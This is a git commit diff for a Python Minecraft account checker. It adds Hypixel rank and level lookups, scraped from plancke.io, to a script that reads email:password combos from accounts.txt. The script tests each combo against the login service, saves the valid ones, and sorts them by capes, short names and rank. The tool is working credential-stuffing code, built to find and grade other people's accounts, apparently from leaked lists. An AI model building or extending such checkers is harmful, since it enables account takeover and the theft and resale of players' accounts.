bc3addb824ede63843c6a715755a476bfe1aaaf7
memesarecool <33184334+memesarecool@users.noreply.github.com>
2018-10-18 10:16:18 -0400

    Added Hypixel level & rank capture

--- main.py
+++ main.py
@@ -5,8 +5,7 @@ from file_creator import *
 
 create_files()
 account_file_lines = open(BASIC_PATH + '\\accounts.txt').read().split('\n')
-counter = [0, 0, 0, 0, 0, 0, 0, 0]
-
+counter = [0,0,0,0,0,0,0,0,0,0,0]
 
 for x in range(len(account_file_lines)):
     email_username = account_file_lines[x].split(':', 1)[0]
@@ -16,9 +15,11 @@ for x in range(len(account_file_lines)):
     if not str(answer).__contains__('Invalid credentials'):
         print('Valid Account')
         UUID = answer["availableProfiles"][0]["id"]
-        #print('UUID: ' + answer["availableProfiles"][0]["id"])
+        print('UUID: ' + answer["availableProfiles"][0]["id"])
         USERNAME = answer["availableProfiles"][0]["name"]
         print('Username: ' + answer["availableProfiles"][0]["name"])
+        hpRank = hypixel_rank_check(USERNAME)
+        hpLevel = hypixel_level_check(USERNAME)
 
         open(FOLDER_PATH + '\\working.txt', 'a').write(account_file_lines[x] + "\n")
         counter[0] += 1
@@ -43,10 +44,22 @@ for x in range(len(account_file_lines)):
             open(FOLDER_PATH + '\\labymod.txt', 'a').write(account_file_lines[x] + "\n")
             counter[6] += 1
             print('Labymod-Cape')
-
+        if liquidbounce_cape_request(UUID) is True:
+            open(FOLDER_PATH + '\\liquidbounce.txt', 'a').write(account_file_lines[x] + "\n")
+            counter[7] += 1
+            print('LiquidBounce-Cape')
+        if hpRank is not False:
+            open(FOLDER_PATH + '\\hypixel.txt', 'a').write(account_file_lines[x] + "\n")
+            counter[8] += 1
+            print('Hypixel Rank: {0}'.format(hpRank))
+        if hpLevel is not False:
+            open(FOLDER_PATH + '\\hypixel.txt', 'a').write(account_file_lines[x] + "\n")
+            counter[9] += 1
+            print('Hypixel Level: {0}'.format(hpLevel))
+        
         if under_four_character_long(USERNAME) is True:
             open(FOLDER_PATH + '\\special_name.txt', 'a').write(account_file_lines[x] + "\n")
-            counter[7] += 1
+            counter[10] += 1
             print('Short name')
 
         print('Progress: ' + str(x + 1)+'/' + str(len(account_file_lines)))
@@ -57,10 +70,11 @@ for x in range(len(account_file_lines)):
 
 print('\n\nResult:\n')
 
-counter_names = [str(counter[0]) + ' Valid accounts', str(counter[1]) + ' InValid accounts',
+counter_names = [str(counter[0]) + ' Valid accounts', str(counter[1]) + ' Invalid accounts',
                  str(counter[2]) + ' Unsecure accounts', str(counter[3]) + ' Minecon accounts',
                  str(counter[4]) + ' 5zig accounts', str(counter[5]) + ' Optifine accounts',
-                 str(counter[6]) + ' Labymod accounts', str(counter[7]) + ' Short-name accounts']
+                 str(counter[6]) + ' Labymod accounts', str(counter[7]) + ' LiquidBounce accounts',
+                 str(counter[8]) + ' Ranked Hypixel accounts', str(counter[10]) + ' Short-name accounts']
 for x in range(len(counter_names) - 0):
     print(counter_names[x])
 
--- special_checker.py
+++ special_checker.py
@@ -1,11 +1,36 @@
-
+import requests
+import re
 
 def under_four_character_long(USERNAME):
     if len(USERNAME) <= 3:
         return True
     else:
         return False
-
-#OG-Account check planed
-#Hypixel rank check planed
-#Hypixel level check planed
+def hypixel_rank_check(USERNAME):
+    try:
+        request_response = requests.get('https://plancke.io/hypixel/player/stats/' + USERNAME).content
+        if (str(request_response).__contains__("Player not found")): return False
+        if str(request_response).__contains__("OWNER"): return 'Owner'
+        elif str(request_response).__contains__("ADMIN"): return 'Admin'
+        elif str(request_response).__contains__("MOD"): return 'Moderator'
+        elif str(request_response).__contains__("HELPER"): return 'Helper'
+        elif str(request_response).__contains__("BUILD TEAM"): return 'Builder'
+        elif str(request_response).__contains__("YOUTUBE"): return 'YouTube'
+        elif str(request_response).__contains__("MVP++"): return 'MVP++'
+        elif str(request_response).__contains__("MVP+"): return 'MVP+'
+        elif str(request_response).__contains__("MVP"): return 'MVP'
+        elif str(request_response).__contains__("VIP+"): return 'VIP+'
+        elif str(request_response).__contains__("VIP"): return 'VIP'
+        else: return False
+    except Exception as e:
+        print(e)
+        pass
+def hypixel_level_check(USERNAME):
+    request_response = requests.get('https://plancke.io/hypixel/player/stats/' + USERNAME).content
+    if (str(request_response).__contains__("Player not found")): return False
+    match = re.search("Level:<\/b> .*?Karma", str(request_response)).group()
+    stepTwoOfTrashCode = match.split("<")
+    okHereYouGo = stepTwoOfTrashCode[1].split('>')
+    return okHereYouGo[1]
+    
+#OG-Account check planned
